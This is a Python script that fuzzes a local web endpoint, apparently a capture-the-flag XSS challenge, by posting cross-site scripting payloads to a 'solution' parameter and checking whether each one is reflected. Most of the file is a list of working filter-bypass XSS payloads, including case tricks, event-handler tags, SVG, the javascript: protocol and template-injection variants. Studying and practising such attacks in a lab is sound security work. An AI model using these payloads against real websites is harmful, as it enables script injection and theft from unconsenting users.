import requests
import re

base_url = "http://127.0.0.1:32911"
target_endpoint = "/xss25"

print("="*80)
print("ANALYZING FULL RESPONSES FOR solution PARAMETER")
print("="*80)

# Test 1: Simple text (baseline)
print("\n[TEST 1] POST solution=test (1006 bytes expected)")
resp1 = requests.post(f"{base_url}{target_endpoint}", data={'solution': 'test'})
print(f"Status: {resp1.status_code} | Size: {len(resp1.text)} bytes")
print(f"Full Response:\n{resp1.text}")

# Test 2: Script tag
print("\n[TEST 2] POST solution=<script>alert('XSS')</script> (827 bytes expected)")
resp2 = requests.post(f"{base_url}{target_endpoint}", data={'solution': "<script>alert('XSS')</script>"})
print(f"Status: {resp2.status_code} | Size: {len(resp2.text)} bytes")
print(f"Full Response:\n{resp2.text}")

# Test 3: Template literal (smallest response)
print("\n[TEST 3] POST solution={{constructor.constructor('alert(1)')()}} (822 bytes expected)")
resp3 = requests.post(f"{base_url}{target_endpoint}", data={'solution': "{{constructor.constructor('alert(1)')()}}"})
print(f"Status: {resp3.status_code} | Size: {len(resp3.text)} bytes")
print(f"Full Response:\n{resp3.text}")

# Test 4: Img tag
print("\n[TEST 4] POST solution=<img src=x onerror=alert('XSS')> (828 bytes expected)")
resp4 = requests.post(f"{base_url}{target_endpoint}", data={'solution': "<img src=x onerror=alert('XSS')>"})
print(f"Status: {resp4.status_code} | Size: {len(resp4.text)} bytes")
print(f"Full Response:\n{resp4.text}")

print("\n" + "="*80)
print("COMPARING RESPONSE DIFFERENCES")
print("="*80)

# Compare responses
if resp1.text != resp2.text:
    print("\n[!] DIFFERENCE DETECTED between 'test' and '<script>...'")
    print(f"Size difference: {len(resp1.text)} - {len(resp2.text)} = {len(resp1.text) - len(resp2.text)} bytes")
    
    # Find where the difference is
    for i, (c1, c2) in enumerate(zip(resp1.text, resp2.text)):
        if c1 != c2:
            print(f"First difference at position {i}")
            print(f"Response 1 from pos {i}: ...{resp1.text[max(0,i-20):i+100]}...")
            print(f"Response 2 from pos {i}: ...{resp2.text[max(0,i-20):i+100]}...")
            break

print("\n" + "="*80)
print("TESTING DIFFERENT PAYLOAD VARIATIONS")
print("="*80)

variations = [
    # Case variations
    ("<SCRIPT>alert('XSS')</SCRIPT>", "uppercase SCRIPT tag"),
    ("<ScRiPt>alert('XSS')</ScRiPt>", "mixed case script tag"),
    
    # Encoded variations
    ("<img src=x onerror=alert(`XSS`)>", "backticks instead of quotes"),
    ("<img/src=x onerror=alert('XSS')>", "slash instead of space"),
    ("<img src=x OnErRoR=alert('XSS')>", "mixed case onerror"),
    
    # Event handler variations
    ("<body onload=alert('XSS')>", "body onload"),
    ("<input onfocus=alert('XSS') autofocus>", "input onfocus"),
    ("<marquee onstart=alert('XSS')>", "marquee onstart"),
    ("<video><source onerror=alert('XSS')>", "video source onerror"),
    ("<audio src=x onerror=alert('XSS')>", "audio onerror"),
    
    # JavaScript protocol
    ("<a href=javascript:alert('XSS')>click</a>", "javascript protocol"),
    
    # SVG variations
    ("<svg><script>alert('XSS')</script></svg>", "svg with script"),
    ("<svg/onload=alert('XSS')>", "svg onload with slash"),
    
    # No tag XSS
    ("javascript:alert('XSS')", "javascript protocol alone"),
    
    # Double encoding
    ("&lt;script&gt;alert('XSS')&lt;/script&gt;", "HTML entities"),
    
    # Unicode
    ("<script>alert\\u0028'XSS'\\u0029</script>", "unicode parentheses"),
]

for payload, description in variations:
    resp = requests.post(f"{base_url}{target_endpoint}", data={'solution': payload})
    print(f"\n[+] {description}")
    print(f"    Payload: {payload[:50]}")
    print(f"    Status: {resp.status_code} | Size: {len(resp.text)} bytes")
    
    # Check if payload is reflected
    if payload in resp.text or payload.replace(' ', '') in resp.text.replace(' ', ''):
        print(f"    [!] PAYLOAD REFLECTED IN RESPONSE!")
    elif 'alert' in resp.text and 'XSS' in resp.text:
        print(f"    [!] PARTIAL REFLECTION - alert/XSS found in response")
    
    # Look for any script/alert in response
    if re.search(r'<script[^>]*>', resp.text, re.IGNORECASE):
        print(f"    [!] Script tag found in response!")
    if re.search(r'onerror\s*=', resp.text, re.IGNORECASE):
        print(f"    [!] onerror handler found in response!")
    if re.search(r'onload\s*=', resp.text, re.IGNORECASE):
        print(f"    [!] onload handler found in response!")

print("\n" + "="*80)
print("TESTING COMPLETE")
print("="*80)
